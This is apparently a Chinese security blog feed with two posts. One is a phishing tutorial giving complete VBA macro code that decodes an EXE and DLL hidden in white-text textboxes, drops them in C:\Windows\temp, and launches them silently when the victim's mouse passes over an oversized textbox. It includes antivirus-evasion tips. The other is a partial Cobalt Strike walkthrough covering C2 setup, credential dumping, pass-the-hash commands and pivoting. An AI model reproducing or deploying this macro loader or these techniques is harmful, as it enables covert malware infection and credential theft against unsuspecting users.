        <content type="html"><![CDATA[<h1 id="钓鱼与社工系列之office宏"><a href="#钓鱼与社工系列之office宏" class="headerlink" title="钓鱼与社工系列之office宏"></a>钓鱼与社工系列之office宏</h1><h2 id="0x01-介绍"><a href="#0x01-介绍" class="headerlink" title="0x01 介绍"></a>0x01 介绍</h2><p>​&emsp;&emsp;根据多次项目实战中发现，office宏仍然是最高的成功率，在静默钓鱼中也是最不容易触发人员的警觉。因为大部分员工即使有安全意识，也是不运行陌生的exe程序，但是对于word文档则没有足够的安全意识，认为word文档都是安全的。正是基于此心理状态，office宏在钓鱼中仍然占据重要成分。</p><p>&emsp;&emsp;当然，现在office在国内市场中其实占据并不多，越来越多人用wps了。那么这种情况下office宏肯定是无效了，下篇文章会针对该情景分析如何钓鱼。</p><h2 id="0x02-宏代码流程及免杀"><a href="#0x02-宏代码流程及免杀" class="headerlink" title="0x02 宏代码流程及免杀"></a>0x02 宏代码流程及免杀</h2><p>&emsp;&emsp;网上有很多项目及文章是如何实现宏免杀的效果，之所以要宏免杀大部分原因都是代码是实现运行宏的时候就直接远程上线到rat上。例如调用powershell或者远程下载等等代码所用到的api或者函数，都被杀软盯着。那么换个思路，我们即不调用powershell执行敏感函数，也不远程下载文件，我们所做要的是<strong>释放文件并通过dll劫持实现上线</strong>。</p><p>&emsp;&emsp;释放文件其实也是个技术活，经过测试，<strong>能否释放文件成功主要看你的文件是不是静态免杀</strong>，如果文件静态免杀，那么就能够成功释放。因为这就是个正常的功能，杀软不可能拦截你释放安全的文件，不然就影响一些职业的正常办公了。而我们用的是dll劫持的方法，白名单程序肯定是安全的文件，<strong>那么就是我们的恶意dll文件如何实现静态免杀了</strong>。如何让dll文件静态免杀的方法很多，网上也有很多项目，这块内容不在该文章里，以后会详细讲解。</p><p>&emsp;&emsp;上段说了释放文件，而文件也都静态免杀了。那么还有一个要注意的地方，那就是dll劫持的程序保存在word文件哪里？首先我们得将dll劫持程序已二进制形式读取出来，然后base64编码后得到了一串字符串，只要释放的时候重新base64解码并已二进制形式写入到磁盘里，这样就能够释放出dll劫持程序了。<strong>那么重点就是该base64字符串存放在哪里？千万别放在宏代码里，很容易被杀，最好的规避杀软的方法就是将base64字符串放到word正文里的文本框等控件里</strong>。然后宏代码去读取文本框里的base64字符串，再解码写入磁盘里并运行白程序实现上线。这样通过该方法就能够实现了宏免杀。</p><p>&emsp;&emsp;最后一步就是如何触发宏了，千万不要使用打开word文件就触发宏的方法，很容易被杀软拦截。我常用的方法就是<strong>弄一个很大的文本框放在第一页，然后当目标的鼠标移动到文本框时就触发宏</strong>。这样的方法既能有效规避杀软，还能在目标不知情的情况下触发了宏！</p><p>&emsp;&emsp;<strong>总结：寻找一个dll劫持的白程序，做一个静态免杀的dll文件，将所有文件以二进制形式读取出来并base64编码后存放到word的文本框里。宏代码功能读取文本框里的字符串并解码写入磁盘，然后运行白程序即可免杀上线！</strong></p><h2 id="0x03-宏代码"><a href="#0x03-宏代码" class="headerlink" title="0x03 宏代码"></a>0x03 宏代码</h2><h3 id="0x03-1-读取文件并base64编码"><a href="#0x03-1-读取文件并base64编码" class="headerlink" title="0x03-1 读取文件并base64编码"></a>0x03-1 读取文件并base64编码</h3><p>先使用下面的代码将白程序和dll文件base64编码得到字符串</p><pre><code>Sub WriteBinary(FileName, Buf)  Dim I, aBuf, Size, bStream  Size = UBound(Buf): ReDim aBuf(Size \ 2)  For I = 0 To Size - 1 Step 2      aBuf(I \ 2) = ChrW(Buf(I + 1) * 256 + Buf(I))  Next  If I = Size Then aBuf(I \ 2) = ChrW(Buf(I))  aBuf = Join(aBuf, &quot;&quot;)  Set bStream = CreateObject(&quot;ADODB.Stream&quot;)  bStream.Type = 1: bStream.Open  With CreateObject(&quot;ADODB.Stream&quot;)    .Type = 2: .Open: .WriteText aBuf    .Position = 2: .CopyTo bStream: .Close  End With  bStream.SaveToFile FileName, 2: bStream.Close  Set bStream = NothingEnd SubFunction Base64Encode(str() As Byte) As String                                  &#39;Base64 编码    On Error GoTo over                                                          &#39;排错    Dim Buf() As Byte, length As Long, mods As Long    Const B64_CHAR_DICT = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=&quot;    mods = (UBound(str) + 1) Mod 3   &#39;除以3的余数    length = UBound(str) + 1 - mods    ReDim Buf(length / 3 * 4 + IIf(mods &lt;&gt; 0, 4, 0) - 1)    Dim I As Long    For I = 0 To length - 1 Step 3        Buf(I / 3 * 4) = (str(I) And &amp;HFC) / &amp;H4        Buf(I / 3 * 4 + 1) = (str(I) And &amp;H3) * &amp;H10 + (str(I + 1) And &amp;HF0) / &amp;H10        Buf(I / 3 * 4 + 2) = (str(I + 1) And &amp;HF) * &amp;H4 + (str(I + 2) And &amp;HC0) / &amp;H40        Buf(I / 3 * 4 + 3) = str(I + 2) And &amp;H3F    Next    If mods = 1 Then        Buf(length / 3 * 4) = (str(length) And &amp;HFC) / &amp;H4        Buf(length / 3 * 4 + 1) = (str(length) And &amp;H3) * &amp;H10        Buf(length / 3 * 4 + 2) = 64        Buf(length / 3 * 4 + 3) = 64    ElseIf mods = 2 Then        Buf(length / 3 * 4) = (str(length) And &amp;HFC) / &amp;H4        Buf(length / 3 * 4 + 1) = (str(length) And &amp;H3) * &amp;H10 + (str(length + 1) And &amp;HF0) / &amp;H10        Buf(length / 3 * 4 + 2) = (str(length + 1) And &amp;HF) * &amp;H4        Buf(length / 3 * 4 + 3) = 64    End If    For I = 0 To UBound(Buf)        Base64Encode = Base64Encode + Mid(B64_CHAR_DICT, Buf(I) + 1, 1)    Nextover:End Function&#39;VB Base64 解码/解密函数：Function Base64Decode(B64 As String) As Byte()                                  &#39;Base64 解码    On Error GoTo over                                                          &#39;排错    Dim OutStr() As Byte, I As Long, j As Long    Const B64_CHAR_DICT = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=&quot;    If InStr(1, B64, &quot;=&quot;) &lt;&gt; 0 Then B64 = Left(B64, InStr(1, B64, &quot;=&quot;) - 1)     &#39;判断Base64真实长度,除去补位    Dim length As Long, mods As Long    mods = Len(B64) Mod 4    length = Len(B64) - mods    ReDim OutStr(length / 4 * 3 - 1 + Switch(mods = 0, 0, mods = 2, 1, mods = 3, 2))    For I = 1 To length Step 4        Dim Buf(3) As Byte        For j = 0 To 3            Buf(j) = InStr(1, B64_CHAR_DICT, Mid(B64, I + j, 1)) - 1            &#39;根据字符的位置取得索引值        Next        OutStr((I - 1) / 4 * 3) = Buf(0) * &amp;H4 + (Buf(1) And &amp;H30) / &amp;H10        OutStr((I - 1) / 4 * 3 + 1) = (Buf(1) And &amp;HF) * &amp;H10 + (Buf(2) And &amp;H3C) / &amp;H4        OutStr((I - 1) / 4 * 3 + 2) = (Buf(2) And &amp;H3) * &amp;H40 + Buf(3)    Next    If mods = 2 Then        OutStr(length / 4 * 3) = (InStr(1, B64_CHAR_DICT, Mid(B64, length + 1, 1)) - 1) * &amp;H4 + ((InStr(1, B64_CHAR_DICT, Mid(B64, length + 2, 1)) - 1) And &amp;H30) / 16    ElseIf mods = 3 Then        OutStr(length / 4 * 3) = (InStr(1, B64_CHAR_DICT, Mid(B64, length + 1, 1)) - 1) * &amp;H4 + ((InStr(1, B64_CHAR_DICT, Mid(B64, length + 2, 1)) - 1) And &amp;H30) / 16        OutStr(length / 4 * 3 + 1) = ((InStr(1, B64_CHAR_DICT, Mid(B64, length + 2, 1)) - 1) And &amp;HF) * &amp;H10 + ((InStr(1, B64_CHAR_DICT, Mid(B64, length + 3, 1)) - 1) And &amp;H3C) / &amp;H4    End If    Base64Decode = OutStr                                                       &#39;读取解码结果over:End FunctionSub test2()    Dim iFN As Integer    Dim sPath As String    Dim bFileSize As Long    Dim sResult As String    Dim arr() As Byte       &#39; 字节数组    Dim arra() As Byte       &#39; 字节数组    Dim infile, outfile, infileBase As String    infile = &quot;C:\Windows\Temp\123.exe&quot;    outfile = &quot;c:\windows\temp\1.exe&quot;    iFN = VBA.FreeFile    bFileSize = VBA.FileLen(infile)    &#39;Debug.Print bFileSize    Open infile For Binary Access Read As iFN    arr = InputB(bFileSize, iFN)        &#39;读取字节流    infileBase = Base64Encode(arr())    &#39;Debug.Print infileBase    Dim FSO    Set FSO = CreateObject(&quot;Scripting.FileSystemObject&quot;)    Set OutPutFile = FSO.OpenTextFile(&quot;C:\windows\temp\test.txt&quot;, 2, True)    OutPutFile.Write (infileBase)    OutPutFile.Close    Set FSO = Nothing    &#39;Dim infileBaseExe As String    &#39;infileBaseExe = Range(&quot;J22&quot;).Value    &#39;infileBaseExe = infileBaseExe + Range(&quot;J23&quot;).Value    &#39;arra = Base64Decode(infileBase)    &#39;WriteBinary outfile, arraEnd Sub</code></pre><h3 id="0x03-2-office宏上线代码"><a href="#0x03-2-office宏上线代码" class="headerlink" title="0x03-2 office宏上线代码"></a>0x03-2 office宏上线代码</h3><p>从文本框中读取base64内容，解码后写入到c:\windows\temp\目录下，当用户鼠标移动或点击到文本框中，触发宏执行木马</p><pre><code>Private Declare PtrSafe Sub Sleep Lib &quot;kernel32&quot; (ByVal Milliseconds As LongPtr)Private Declare PtrSafe Function GetProcAddress Lib &quot;kernel32&quot; (ByVal hModule As LongPtr, ByVal lpProcName As String) As LongPtrPrivate Declare PtrSafe Function LoadLibrary Lib &quot;kernel32&quot; Alias &quot;LoadLibraryA&quot; (ByVal lpLibFileName As String) As LongPtrPrivate Declare PtrSafe Function VirtualProtect Lib &quot;kernel32&quot; (lpAddress As Any, ByVal dwSize As LongPtr, ByVal flNewProtect As Long, lpflOldProtect As Long) As LongPrivate Declare PtrSafe Sub ByteSwapper Lib &quot;kernel32.dll&quot; Alias &quot;RtlFillMemory&quot; (Destination As Any, ByVal length As Long, ByVal Fill As Byte)Private Declare PtrSafe Sub Peek Lib &quot;msvcrt&quot; Alias &quot;memcpy&quot; (ByRef pDest As Any, ByRef pSource As Any, ByVal nBytes As Long)Private Declare PtrSafe Function CreateProcess Lib &quot;kernel32&quot; Alias &quot;CreateProcessA&quot; (ByVal lpApplicationName As String, ByVal lpCommandLine As String, lpProcessAttributes As Any, lpThreadAttributes As Any, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, lpEnvironment As Any, ByVal lpCurrentDriectory As String, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As LongPrivate Declare PtrSafe Function OpenProcess Lib &quot;kernel32.dll&quot; (ByVal dwAccess As Long, ByVal fInherit As Integer, ByVal hObject As Long) As LongPrivate Declare PtrSafe Function TerminateProcess Lib &quot;kernel32&quot; (ByVal hProcess As Long, ByVal uExitCode As Long) As LongPrivate Declare PtrSafe Function CloseHandle Lib &quot;kernel32&quot; (ByVal hObject As Long) As LongPrivate Type PROCESS_INFORMATION    hProcess As Long    hThread As Long    dwProcessId As Long    dwThreadId As LongEnd TypePrivate Type STARTUPINFO    cb As Long    lpReserved As String    lpDesktop As String    lpTitle As String    dwX As Long    dwY As Long    dwXSize As Long    dwYSize As Long    dwXCountChars As Long    dwYCountChars As Long    dwFillAttribute As Long    dwFlags As Long    wShowWindow As Integer    cbReserved2 As Integer    lpReserved2 As Long    hStdInput As Long    hStdOutput As Long    hStdError As LongEnd TypeConst CREATE_NO_WINDOW = &amp;H8000000Const CREATE_NEW_CONSOLE = &amp;H10Function fileExist(filePath)    Dim fso    Set fso = CreateObject(&quot;Scripting.FileSystemObject&quot;)    If fso.fileExists(filePath) Then        fileExist = True    Else        fileExist = False    End If    Set fso = NothingEnd FunctionFunction dddddd(B64 As String) As Byte()    On Error GoTo over    Dim OutStr() As Byte, i As Long, j As Long    Const B64_CHAR_DICT = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=&quot;    If InStr(1, B64, &quot;=&quot;) &lt;&gt; 0 Then B64 = Left(B64, InStr(1, B64, &quot;=&quot;) - 1)    Dim length As Long, mods As Long    mods = Len(B64) Mod 4    length = Len(B64) - mods    ReDim OutStr(length / 4 * 3 - 1 + Switch(mods = 0, 0, mods = 2, 1, mods = 3, 2))    For i = 1 To length Step 4        Dim buf(3) As Byte        For j = 0 To 3            buf(j) = InStr(1, B64_CHAR_DICT, Mid(B64, i + j, 1)) - 1        Next        OutStr((i - 1) / 4 * 3) = buf(0) * &amp;H4 + (buf(1) And &amp;H30) / &amp;H10        OutStr((i - 1) / 4 * 3 + 1) = (buf(1) And &amp;HF) * &amp;H10 + (buf(2) And &amp;H3C) / &amp;H4        OutStr((i - 1) / 4 * 3 + 2) = (buf(2) And &amp;H3) * &amp;H40 + buf(3)    Next    If mods = 2 Then        OutStr(length / 4 * 3) = (InStr(1, B64_CHAR_DICT, Mid(B64, length + 1, 1)) - 1) * &amp;H4 + ((InStr(1, B64_CHAR_DICT, Mid(B64, length + 2, 1)) - 1) And &amp;H30) / 16    ElseIf mods = 3 Then        OutStr(length / 4 * 3) = (InStr(1, B64_CHAR_DICT, Mid(B64, length + 1, 1)) - 1) * &amp;H4 + ((InStr(1, B64_CHAR_DICT, Mid(B64, length + 2, 1)) - 1) And &amp;H30) / 16        OutStr(length / 4 * 3 + 1) = ((InStr(1, B64_CHAR_DICT, Mid(B64, length + 2, 1)) - 1) And &amp;HF) * &amp;H10 + ((InStr(1, B64_CHAR_DICT, Mid(B64, length + 3, 1)) - 1) And &amp;H3C) / &amp;H4    End If    dddddd = OutStrover:End FunctionFunction runCommand(comando)    Dim pInfo As PROCESS_INFORMATION    Dim sInfo As STARTUPINFO    Dim sNull As String    Dim lSuccess As Long    Dim lRetValue As Long    lSuccess = CreateProcess(sNull, comando, ByVal 0&amp;, ByVal 0&amp;, 1&amp;, CREATE_NO_WINDOW, ByVal 0&amp;, sNull, sInfo, pInfo)    lRetValue = CloseHandle(pInfo.hThread)    lRetValue = CloseHandle(pInfo.hProcess)End FunctionFunction WriteBinary(FileName, buf)  Dim i, aBuf, Size, bStream  Size = UBound(buf): ReDim aBuf(Size \ 2)  For i = 0 To Size - 1 Step 2      aBuf(i \ 2) = ChrW(buf(i + 1) * 256 + buf(i))  Next  If i = Size Then aBuf(i \ 2) = ChrW(buf(i))  aBuf = Join(aBuf, &quot;&quot;)  Set bStream = CreateObject(&quot;ADODB.Stream&quot;)  bStream.Type = 1: bStream.Open  With CreateObject(&quot;ADODB.Stream&quot;)    .Type = 2: .Open: .WriteText aBuf    .Position = 2: .CopyTo bStream: .Close  End With  bStream.SaveToFile FileName, 2: bStream.Close  Set bStream = NothingEnd FunctionFunction releaseFile(path As String, conte As String)    hwminiArra = dddddd(conte)    WriteBinary path, hwminiArraEnd FunctionFunction start()    Dim filePath As String    filePath = &quot;C:\Windows\temp\aaaaaaa.exe&quot;    If Not fileExist(filePath) Then        releaseFile &quot;C:\Windows\temp\aaaaaaa.exe&quot;, Replace(ActiveDocument.Shapes(1).TextFrame.TextRange, Chr(13), Empty)        releaseFile &quot;C:\Windows\temp\aaaaaaaaaaa.dll&quot;, Replace(ActiveDocument.Shapes(2).TextFrame.TextRange, Chr(13), Empty)    End If    runCommand (filePath)End FunctionPrivate Sub TextBox2_MouseDown(ByVal Button As Integer, ByVal Shift As Integer, ByVal X As Single, ByVal Y As Single)    Static i As Integer    i = i + 1    If i &lt; 3 Then        start    End IfEnd SubPrivate Sub TextBox2_MouseMove(ByVal Button As Integer, ByVal Shift As Integer, ByVal X As Single, ByVal Y As Single)    Static i As Integer    i = i + 1    If i &lt; 3 Then        start    End IfEnd Sub</code></pre><h2 id="0x04-隐藏文本框"><a href="#0x04-隐藏文本框" class="headerlink" title="0x04 隐藏文本框"></a>0x04 隐藏文本框</h2><p>将dll劫持的程序base64编码后存放在文本框里</p><p><img src="/img/officeMacro/2e0174b7-ec47-49aa-adda-9c570b8bd365.png" alt="img"></p><p>文本框的线条设置为无颜色</p><p><img src="/img/officeMacro/fffbd65a-61d4-4bee-bce7-90965bfa080b.png" alt="img"></p><p><img src="/img/officeMacro/0fbf519d-64fe-4ce4-a18a-53366dbf2c4d.png" alt="img"></p><p><img src="/img/officeMacro/e0732e74-e9c6-4384-b5de-8aa843b202c4.png" alt="img"></p><p>将base64字符串的字体设置为白色，</p><p><img src="/img/officeMacro/bb2c62f3-45fe-4b71-a40c-b74a7cd94c19.png" alt="img"></p><p>将最后一页的最上方空白行删掉，那么这时候就看不到文本框了</p><p><img src="/img/officeMacro/ce27f099-b5f2-4e73-942e-f9ccd3a5378a.png" alt="img"></p><p>在首页将触发宏的文本框拉到最大，然后话术诱导目标将鼠标移动或点击文本框</p><p><img src="/img/officeMacro/2c98a350-80c7-45b9-b453-4cc6f089bf65.png" alt="img"></p><h2 id="0x05-宏代码加密"><a href="#0x05-宏代码加密" class="headerlink" title="0x05 宏代码加密"></a>0x05 宏代码加密</h2><p>​    为了防止宏代码被分析，可以设置密码。当然这仅仅只是防不懂的人，懂的人还是会用工具解密的。</p><p><img src="/img/officeMacro/34bfdf24-af9c-48e4-b118-cabb0d5056c0.png" alt="img"></p><p><img src="/img/officeMacro/968c0feb-3be6-4d28-8127-428dba5f747e.png" alt="img"></p>]]></content>
      
      
      <categories>
          
          <category> 钓鱼与社工 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 钓鱼与社工系列之office宏 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CobalStrike扫盲</title>
      <link href="/2020/11/27/cobalstrike-sao-mang/"/>
      <url>/2020/11/27/cobalstrike-sao-mang/</url>
      
        <content type="html"><![CDATA[<h1 id="CobalStrike"><a href="#CobalStrike" class="headerlink" title="CobalStrike"></a>CobalStrike</h1><pre><code>安装、运行、介绍上线+命令执行取密码socks4 代理扩展脚本-cnahash传递（端口扫描）中转上线（不出网的情况下上线）和msf联动屏幕截图，键盘记录ssh上线</code></pre><h2 id="0x01-安装、运行、介绍"><a href="#0x01-安装、运行、介绍" class="headerlink" title="0x01 安装、运行、介绍"></a>0x01 安装、运行、介绍</h2><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><pre><code>apt install default-jdk将cs文件夹复制到Linux下chmod 777 teamserver</code></pre><p><img src="/img/CobalStrikeLiteracy/0.4295879606896589.png" alt="img"></p><h3 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h3><pre><code>./teamserver &lt;host&gt; &lt;password&gt; [/path/to/c2.profile] [YYYY-MM-DD]&lt;host&gt; 必需参数 团队服务器IP&lt;password&gt; 必需参数 连接服务器的密码[/path/to/c2.profile] 可选参数 指定C2通信配置文件，体现其强大的扩展性[YYYY-MM-DD] 可选参数 所有payload的终止时间# 启动Team Server./teamserver 192.168.183.147 123456 # 设置强密码，否则容易被爆破，参考附录默认连接端口为50050，如果你想修改端口只需修改teamserver文件</code></pre><p><img src="/img/CobalStrikeLiteracy/0.030918049820894786.png" alt="img"></p><p><img src="/img/CobalStrikeLiteracy/0.2975981257563896.png" alt="img"></p><h3 id="参数详情"><a href="#参数详情" class="headerlink" title="参数详情"></a>参数详情</h3><p>Cobalt Strike</p><pre><code>New Connection # 新建连接，支持连接多个服务器端Preferences # 设置Cobal Strike界面、控制台、以及输出报告样式、TeamServer连接记录Visualization # 主要展示输出结果的视图VPN Interfaces # 设置VPN接口Listenrs # 创建监听器Script Manager # 脚本管理，可以通过AggressorScripts脚本来加强自身，能够扩展菜单栏，Beacon命令行，提权脚本等Close # 退出连接</code></pre><p><img src="/img/CobalStrikeLiteracy/0.13801954727640234.png" alt="img"></p><p>View</p><pre><code>Applications # 显示受害主机的应用信息Credentials # 显示所有以获取的受害主机的凭证，如hashdump、MimikatzDownloads # 查看已下载文件Event Log # 主机上线记录以及团队协作聊天记录Keystrokes # 查看键盘记录结果Proxy Pivots # 查看代理模块Screenshots # 查看所有屏幕截图Script Console # 加载第三方脚本以增强功能 Targets # 显示所有受害主机Web Log # 所有Web服务的日志</code></pre><p><img src="/img/CobalStrikeLiteracy/0.16414763602254645.png" alt="img"></p><p>Attacks</p><pre><code>PackagesHTML Application # 生成(executable/VBA/powershell)这三种原理实现的恶意HTA木马文件MS Office Macro # 生成office宏病毒文件Payload Generator # 生成各种语言版本的payloadUSB/CD AutoPlay # 生成利用自动播放运行的木马文件Windows Dropper # 捆绑器能够对任意的正常文件进行捆绑(免杀效果差)Windows Executable # 生成可执行exe木马Windows Executable(Stageless) # 生成无状态的可执行exe木马</code></pre><p><img src="/img/CobalStrikeLiteracy/0.39729118995260604.png" alt="img"></p><p>Web Drive-by</p><pre><code>Manage # 对开启的web服务进行管理Clone Site # 克隆网站，可以记录受害者提交的数据Host File # 提供文件下载，可以选择Mime类型Scripted Web Delivery # 为payload提供web服务以便下载和执行，类似于Metasploit的web_delivery Signed Applet Attack # 使用java自签名的程序进行钓鱼攻击(该方法已过时)Smart Applet Attack # 自动检测java版本并进行攻击，针对Java 1.6.0_45以下以及Java 1.7.0_21以下版本(该方法已过时)System Profiler # 用来获取系统信息，如系统版本，Flash版本，浏览器版本等Spear Phish # 鱼叉钓鱼邮件</code></pre><p><img src="/img/CobalStrikeLiteracy/0.07192938054993915.png" alt="img"></p><p>Reporting</p><pre><code>Activity Report # 活动报告Hosts Report # 主机报告Indicators of Compromise # IOC报告：包括C2配置文件的流量分析、域名、IP和上传文件的MD5 hashesSessions Report # 会话报告Social Engineering Report # 社会工程报告：包括鱼叉钓鱼邮件及点击记录Tactics, Techniques, and Procedures # 战术技术及相关程序报告：包括行动对应的每种战术的检测策略和缓解策略Reset Data # 重置数据Export Data # 导出数据，导出.tsv文件格式</code></pre><p><img src="/img/CobalStrikeLiteracy/0.4228559550173042.png" alt="img"></p><p>Help</p><pre><code>Homepage # 官方主页Support # 技术支持Arsenal # 开发者System information # 版本信息About # 关于</code></pre><p><img src="/img/CobalStrikeLiteracy/0.40007668547560965.png" alt="img"></p><p>工具栏</p><pre><code>1.新建连接2.断开当前连接3.监听器4.改变视图为Pivot Graph(视图列表)5.改变视图为Session Table(会话列表)6.改变视图为Target Table(目标列表)7.显示所有以获取的受害主机的凭证8.查看已下载文件9.查看键盘记录结果10.查看屏幕截图11.生成无状态的可执行exe木马12.使用java自签名的程序进行钓鱼攻击13.生成office宏病毒文件14.为payload提供web服务以便下载和执行15.提供文件下载，可以选择Mime类型16.管理Cobalt Strike上运行的web服务17.帮助18.关于</code></pre><p><img src="/img/CobalStrikeLiteracy/0.6533318592180974.png" alt="img"></p><h2 id="0x02-上线"><a href="#0x02-上线" class="headerlink" title="0x02 上线"></a>0x02 上线</h2><h3 id="脚本上线"><a href="#脚本上线" class="headerlink" title="脚本上线"></a>脚本上线</h3><p><img src="/img/CobalStrikeLiteracy/3d1d80e5-2da3-42ae-868f-9f0c68725a9d.png" alt="img"></p><p>创建监听器</p><p><img src="/img/CobalStrikeLiteracy/e481d734-6f7a-4c56-9a4a-3608208e9376.png" alt="img"></p><p>选择上线脚本</p><p><img src="/img/CobalStrikeLiteracy/89e1e655-b2e6-468b-a6e3-f59dacc4e055.png" alt="img"></p><p>生成上线脚本</p><p><img src="/img/CobalStrikeLiteracy/8e8bc7c7-5dea-4f71-8be5-59e1351520e4.png" alt="img"></p><p>目标机器执行</p><p><img src="/img/CobalStrikeLiteracy/5c1a89e8-ce77-454c-97e0-6521b7979e72.png" alt="img"></p><p>成功上线</p><p><img src="/img/CobalStrikeLiteracy/2c4d3ecc-9418-4003-8514-7b1dfbd4a193.png" alt="img"></p><p>dll上线-针对windows2003系统</p><p><img src="/img/CobalStrikeLiteracy/95d70b3a-5d25-4c6e-8fb4-d2d8a43a529b.png" alt="img"></p><p><img src="/img/CobalStrikeLiteracy/4868ce1b-0b75-4409-a2c2-1d36f17105e0.png" alt="img"></p><p><img src="/img/CobalStrikeLiteracy/ed747050-b9be-4bb8-9284-d92b950f48dd.png" alt="img"></p><p><img src="/img/CobalStrikeLiteracy/66116645-f061-4062-9e13-ad20a2182c7e.png" alt="img"></p><p>改变心跳时间</p><p><img src="/img/CobalStrikeLiteracy/a48189f6-04ea-4d5e-b86e-8b909ea04a9a.png" alt="img"></p><p><img src="/img/CobalStrikeLiteracy/f1c8e5dc-6d7b-4d59-8dbc-e94185775f87.png" alt="img"></p><p>执行命令</p><p>shell command</p><p><img src="/img/CobalStrikeLiteracy/58148862-d11c-405e-a99d-abddec9cce3e.png" alt="img"></p><p>派生</p><p><img src="/img/CobalStrikeLiteracy/fb60c9c4-d253-453e-8360-cd544bad1f63.png" alt="img"></p><p><img src="/img/CobalStrikeLiteracy/c10b4b34-c719-4e38-9340-ede16c643f3b.png" alt="img"></p><p>成功又出现一个</p><p><img src="/img/CobalStrikeLiteracy/64282938-2f15-44e4-abd2-84a0d7328c28.png" alt="img"></p><p>查看文件</p><p><img src="/img/CobalStrikeLiteracy/adf1e010-7cd6-4aa8-a4d8-28339918171d.png" alt="img"></p><p><img src="/img/CobalStrikeLiteracy/9a33a714-0b38-454a-8fe5-3c150960656f.png" alt="img"></p><p>上传文件</p><p><img src="/img/CobalStrikeLiteracy/e50edd1f-b21d-4b82-9d68-5ff4b48498dd.png" alt="img"></p><p><img src="/img/CobalStrikeLiteracy/fc09befa-bcea-40b6-978f-49a93673d39e.png" alt="img"></p><p>下载文件</p><p><img src="/img/CobalStrikeLiteracy/412755e7-5519-4ed0-9088-92075b5b63c8.png" alt="img"></p><p><img src="/img/CobalStrikeLiteracy/6feea086-714c-41d8-bacd-9b3f0e538292.png" alt="img"></p><p><img src="/img/CobalStrikeLiteracy/b1c66fbf-4d06-4868-9c97-e10e3631f234.png" alt="img"></p><h2 id="0x03-取密码"><a href="#0x03-取密码" class="headerlink" title="0x03 取密码"></a>0x03 取密码</h2><p>内存hash</p><p><img src="/img/CobalStrikeLiteracy/f5a584e4-1eb3-4d2f-ba96-e25e2ff23f1d.png" alt="img"></p><p>注册表的hash</p><p><img src="/img/CobalStrikeLiteracy/be307192-274e-4e46-ac0f-07922005f148.png" alt="img"></p><p><img src="/img/CobalStrikeLiteracy/6433ab39-1806-4bfb-87b3-c5b10709e7a8.png" alt="img"></p><h2 id="0x04-socks4-a-代理"><a href="#0x04-socks4-a-代理" class="headerlink" title="0x04 socks4 a 代理"></a>0x04 socks4 a 代理</h2><p><img src="/img/CobalStrikeLiteracy/8ccb0736-f712-4914-af01-67894b82c2a8.png" alt="img"></p><p><img src="/img/CobalStrikeLiteracy/463ada81-1267-40ab-8ceb-616331f07474.png" alt="img"></p><p><img src="/img/CobalStrikeLiteracy/60c0f8e1-6fcc-4c54-a108-73f60fd08073.png" alt="img"></p><p>成功代理</p><p><img src="/img/CobalStrikeLiteracy/35fa1d93-9476-453e-ae77-46461c1589b2.png" alt="img"></p><h2 id="0x05-扩展脚本-cna"><a href="#0x05-扩展脚本-cna" class="headerlink" title="0x05 扩展脚本-cna"></a>0x05 扩展脚本-cna</h2><p>Ladon</p><pre><code>https://github.com/k8gege/Ladon</code></pre><p><img src="/img/CobalStrikeLiteracy/c6a8adbd-73c3-41cf-8fc1-c91557d2ab5f.png" alt="img"></p><p><img src="/img/CobalStrikeLiteracy/b5ed6eff-49af-4e24-a90b-b5aaf607fe4b.png" alt="img"></p><p>成功加载</p><p><img src="/img/CobalStrikeLiteracy/ab281c7f-3bf1-4f10-91ac-2fc87336a32b.png" alt="img"></p><p>运行Ladon</p><p><img src="/img/CobalStrikeLiteracy/a4888c5b-eda9-43d0-885d-7bf0c9af13ed.png" alt="img"></p><pre><code>Ladon 192.168.11.0/24 OnlinePC      存活扫描Ladon 192.168.11.0/24 PortScan      端口扫描Ladon 192.168.11.0/24 WebScan       web扫描Ladon 192.168.11.0/24 MS17010       17010扫描</code></pre><p>还有很多功能，自行研究</p><h2 id="0x06-hash传递"><a href="#0x06-hash传递" class="headerlink" title="0x06 hash传递"></a>0x06 hash传递</h2><p>psexec pth传递单个上线</p><pre><code>pth 域名\用户名 密码ntlmpsexec ip\域机器 ADMIN$ 监听的名字pth domain\administrator 88966b179aaaaaa67870a34eafpsexec DC02 ADMIN$ a                            a是监听的名字pth .\administrator 5a09d1400b366aaaaa2344a3d07375psexec 10.192.204.5 ADMIN$ 1111                    1111是监听</code></pre><p>成功上线（前提是能够出网）</p><p><img src="/img/CobalStrikeLiteracy/4101640.png" alt="img"></p><p>使用相同的账号密码批量上线</p><p>\1. 端口扫描判断存活</p><p>\2. 选中存活的主机，批量登录-使用psexec_psh</p><p><img src="/img/CobalStrikeLiteracy/0.39369171800484487.png" alt="img"></p><p><img src="/img/CobalStrikeLiteracy/0.5840731309741612.png" alt="img"></p><p>扫描结果</p><p><img src="/img/CobalStrikeLiteracy/4036484.png" alt="img"></p><p>选中存活机器，右键login-&gt;psexec(psh)</p><p><img src="/img/CobalStrikeLiteracy/0.3387576826443788.png" alt="img"></p><p>如果是域用户，则domain框填写域名，本地用户，则domain框随便填写</p><p>session选择当前控制的机器</p><p><img src="/img/CobalStrikeLiteracy/4167546.png" alt="img"></p><p>launch，就会对存活主机hash传递并上线</p><p><img src="/img/CobalStrikeLiteracy/0.15842965852393573.png" alt="img"></p><p>成功和失败的结果</p><p><img src="/img/CobalStrikeLiteracy/0.2904655007953677.png" alt="img"></p><h2 id="0x07-中转上线"><a href="#0x07-中转上线" class="headerlink" title="0x07 中转上线"></a>0x07 中转上线</h2><p>内网不出网的机器中转上线</p><p>当前机器开启一个监听</p><p><img src="/img/CobalStrikeLiteracy/0.6096430050494017.png" alt="img"></p><p>Name随便填写一个，其他的默认即可</p><p><img src="/img/CobalStrikeLiteracy/0.8974812485398633.png" alt="img"></p><p><img src="/img/CobalStrikeLiteracy/0.32524435229508597.png" alt="img"></p><p>Stage选择zhongzhuan，output选择exe，然后会生成一个beacon.exe</p><p><img 